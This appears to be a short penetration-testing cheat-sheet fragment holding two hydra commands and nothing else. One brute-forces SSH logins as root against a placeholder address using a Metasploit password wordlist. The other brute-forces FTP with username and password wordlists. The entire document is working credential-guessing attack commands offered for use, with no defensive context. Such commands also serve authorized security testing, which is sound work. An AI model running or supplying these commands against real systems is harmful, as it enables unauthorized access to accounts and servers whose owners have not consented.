
```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://$IP:22 -t 4 -V
```

```
hydra -L path/to/usernames.txt -P path/to/wordlist.txt <IP> ftp
```
